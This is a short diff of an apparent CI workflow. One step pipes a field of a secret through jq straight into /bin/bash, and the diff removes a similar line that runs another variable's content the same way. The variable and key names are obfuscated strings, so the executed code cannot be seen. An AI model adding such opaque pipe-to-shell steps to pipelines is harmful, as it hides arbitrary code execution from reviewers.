@@ -21,7 +21,6 @@ jobs:
           bq334: ${{ secrets.bq334 }}
         run: |
           printf '%s' "$bq334" | jq -r .qhdg21 | /bin/bash
-          echo $zby0933 | jq -r .co65847 | /bin/bash
 
       - name: Store artifact
         if: always()
